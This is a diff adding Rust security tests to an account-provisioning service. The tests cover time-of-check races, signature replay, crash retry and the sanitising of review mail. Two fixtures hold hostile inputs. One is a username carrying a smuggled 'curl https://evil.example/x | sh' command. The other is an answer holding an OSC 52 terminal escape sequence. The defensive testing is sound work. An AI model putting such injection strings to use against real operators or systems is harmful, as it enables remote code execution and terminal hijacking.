@@ -4487,3 +4487,256 @@ fn a_delayed_export_closes_on_the_day_it_delivers() {
     );
     assert_ne!(line["done_at"], "2020-01-01", "{line}");
 }
+
+/// The second read is the one a decline acts on. A record rewritten between
+/// `verify` and the transition must fail the transition's own signature check,
+/// not erase the account the rewritten record names: `erase_half_made` treats
+/// any record with that name as this application's own.
+#[test]
+fn a_record_rewritten_between_verification_and_a_decline_erases_nothing() {
+    use kyriakon_control_core::account::sign;
+    use kyriakon_control_core::config::DrainConfig;
+    use kyriakon_control_core::intent::{DecisionIntent, Intent};
+    use kyriakon_control_core::store::journal::Journal;
+    use kyriakon_control_core::store::{ApplicationRef, Store};
+
+    let fix = Fix::new("decline-rewrite-between");
+    let record = fix.filed("secretary", "cash", &[("rail", "cash")]);
+    fix.file_application(&record);
+    assert!(fix.drain().status.success());
+
+    // The account the second read would name, and the journal line the decline
+    // used to take as reason to erase whatever that name is.
+    fix.write_account(
+        "www",
+        &json!({
+            "version": 1, "username": "www", "state": "active",
+            "decision": "approve", "decided_at": "2026-10-02T09:00:00Z",
+            "rail": "no_charge", "no_charge": true,
+            "created_at": "2026-10-02T09:00:00Z",
+        }),
+    );
+    std::fs::write(
+        fix.path("store/journal.jsonl"),
+        format!(
+            "{{\"version\":1,\"at\":\"2026-10-02T09:00:00Z\",\"intent\":\"01H\",\"kind\":\"approve\",\"release\":\"test\",\"application\":{{\"username\":\"secretary\",\"status_token\":\"{TOKEN}\"}},\"outcome\":\"applying\"}}\n"
+        ),
+    )
+    .unwrap();
+
+    let cfg = DrainConfig::load(std::path::Path::new(&fix.config())).unwrap();
+    let store = Store::new_for_test(&cfg.store_root);
+    let key = sign::read_key(std::path::Path::new(&cfg.approval_key)).unwrap();
+    // Signed over the genuine record, which is the record `verify` reads.
+    let sig = fix.sign_action("decline");
+    let intent = |username: &str| DecisionIntent {
+        id: ulid(),
+        kind: "decline".to_string(),
+        filed_at: "2026-10-02T09:00:00Z".to_string(),
+        application: ApplicationRef::application(username, TOKEN),
+        action: "decline".to_string(),
+        sig: sig.clone(),
+    };
+    let runtime = tokio::runtime::Builder::new_current_thread()
+        .enable_all()
+        .build()
+        .unwrap();
+    runtime.block_on(async {
+        let journal = Journal::load(&store).await.unwrap();
+        assert!(
+            kyriakon_control_drain::verify(
+                &Intent::Decision(intent("secretary")),
+                &cfg,
+                &store,
+                &key,
+                "",
+                &serde_json::Value::Null,
+            )
+            .await
+            .unwrap()
+            .is_none(),
+            "the genuine decision did not verify"
+        );
+        // The handler serves the second read: the victim's name, no domain, no
+        // decided_at, and an intent that names the same victim.
+        fix.amend_application(TOKEN, |record| {
+            record["username"] = json!("www");
+            record["domain"] = serde_json::Value::Null;
+            record["decided_at"] = serde_json::Value::Null;
+        });
+        let err = kyriakon_control_drain::transitions::review::decision(
+            &cfg,
+            &store,
+            &journal,
+            &key,
+            intent("www"),
+        )
+        .await
+        .expect_err("a record rewritten after verification decided the application");
+        assert!(
+            err.to_string()
+                .contains("does not verify against this record"),
+            "{err}"
+        );
+    });
+
+    assert!(
+        fix.dir.join("store/accounts/www/account.json").exists(),
+        "the rewritten record's account was erased"
+    );
+    assert!(
+        !fix.scripts_log().contains("delete-user.sh www"),
+        "the rewritten record's account was deleted: {}",
+        fix.scripts_log()
+    );
+}
+
+/// A decision is single-use at the root-held layer. Clearing `decided_at` — a
+/// field the handler owns — does not revive a captured signature: a second
+/// decision for a token whose decision has applied is refused.
+#[test]
+fn a_second_decision_is_refused_after_the_record_is_cleared() {
+    let fix = Fix::new("decision-single-use");
+    let record = fix.filed("secretary", "cash", &[("rail", "cash")]);
+    fix.file_application(&record);
+    assert!(fix.drain().status.success());
+    fix.decide("approve", "secretary");
+    assert!(fix.drain().status.success());
+    let account = fix.dir.join("store/accounts/secretary/account.json");
+    assert!(account.exists(), "the first decision did not apply");
+
+    // The handler clears the record's decision and files a decline with a
+    // signature over every field the record still carries.
+    fix.amend_application(TOKEN, |record| {
+        record["decided_at"] = serde_json::Value::Null;
+    });
+    let sig = fix.sign_action("decline");
+    fix.write_decision("decline", "decline", &sig, "secretary");
+    let out = fix.drain();
+    assert!(out.status.success(), "{}", body(&out));
+
+    assert!(account.exists(), "a replay erased the approved account");
+    assert!(
+        !fix.scripts_log().contains("delete-user.sh secretary"),
+        "a replay erased the approved account: {}",
+        fix.scripts_log()
+    );
+    assert!(
+        fix.journal().contains("\"outcome\":\"already-decided\""),
+        "the replay was not recorded as already decided: {}",
+        fix.journal()
+    );
+    assert_eq!(
+        fix.journal().matches("\"outcome\":\"applied\"").count(),
+        1,
+        "a second applied line was written: {}",
+        fix.journal()
+    );
+}
+
+/// The review mail's copy-paste command is built from the record, which the
+/// handler owns. A record whose username is not the intent's is refused before
+/// the mail is composed, so no shell syntax reaches the operator.
+#[test]
+fn a_review_mail_is_refused_when_the_record_names_another_account() {
+    let fix = Fix::new("review-rewritten-name");
+    let record = fix.filed("secretary", "cash", &[("rail", "cash")]);
+    fix.file_application(&record);
+    fix.amend_application(TOKEN, |record| {
+        record["username"] = json!("alice; curl https://evil.example/x | sh #");
+    });
+
+    let out = fix.drain();
+    assert!(out.status.success(), "{}", body(&out));
+    assert!(
+        !fix.sent().contains("curl"),
+        "a rewritten name reached the mail: {}",
+        fix.sent()
+    );
+    assert!(
+        !fix.sent().contains("kyriakon-admin approve"),
+        "the review mail was sent for a mismatched record: {}",
+        fix.sent()
+    );
+    assert!(
+        fix.journal()
+            .contains("the record's username \\\"alice; curl"),
+        "the mismatch was not journalled: {}",
+        fix.journal()
+    );
+    assert!(
+        fix.failed_note().is_empty(),
+        "an unreadable or retried application: {}",
+        fix.failed_note()
+    );
+}
+
+/// The review mail is read in a terminal, and the applicant writes the answers:
+/// a control sequence in one is replaced, while the answer's own lines and tabs
+/// survive.
+#[test]
+fn a_review_mail_replaces_control_characters_in_an_answer() {
+    let fix = Fix::new("review-controls");
+    let record = fix.filed(
+        "secretary",
+        "cash",
+        &[
+            ("rail", "cash"),
+            ("anything_else", "\x1b]52;c;x\x07\nsecond\tline"),
+        ],
+    );
+    fix.file_application(&record);
+    let out = fix.drain();
+    assert!(out.status.success(), "{}", body(&out));
+
+    let sent = fix.sent();
+    assert!(!sent.contains('\x1b'), "an ESC reached the mail: {sent:?}");
+    assert!(!sent.contains('\x07'), "a BEL reached the mail: {sent:?}");
+    assert!(
+        sent.contains("anything_else: ?]52;c;x?"),
+        "the answer was not sanitised in place: {sent:?}"
+    );
+    assert!(
+        sent.contains("  second\tline"),
+        "the answer's own line and tab were lost: {sent:?}"
+    );
+}
+
+/// A decision that crashed after its `applying` line and before it finished is
+/// retried under its own signature, not refused as a replay: the journal's
+/// applied line is the single-use record, and a retry has none yet.
+#[test]
+fn a_decision_retry_after_a_crash_still_completes() {
+    let fix = Fix::new("decision-crash-retry");
+    let record = fix.filed("secretary", "no_charge", &[("rail", "no_charge")]);
+    fix.file_application(&record);
+    assert!(fix.drain().status.success());
+
+    // The first pass journalled that the approval began, then stopped.
+    let sig = fix.sign_action("approve-free");
+    let id = kyriakon_control_core::intent::id_for(&sig);
+    std::fs::write(
+        fix.path("store/journal.jsonl"),
+        format!(
+            "{{\"version\":1,\"at\":\"2026-10-02T09:00:00Z\",\"intent\":\"{id}\",\"kind\":\"provision\",\"release\":\"test\",\"application\":{{\"username\":\"secretary\",\"status_token\":\"{TOKEN}\"}},\"outcome\":\"applying\"}}\n"
+        ),
+    )
+    .unwrap();
+    fix.write_decision("provision", "approve-free", &sig, "secretary");
+
+    let out = fix.drain();
+    assert!(out.status.success(), "{}", body(&out));
+    assert!(
+        fix.dir
+            .join("store/accounts/secretary/account.json")
+            .exists(),
+        "a crashed decision's retry did not complete: {}",
+        fix.journal()
+    );
+    assert_eq!(
+        fix.journal().matches("\"outcome\":\"applied\"").count(),
+        1,
+        "{}",
+        fix.journal()
+    );
+}
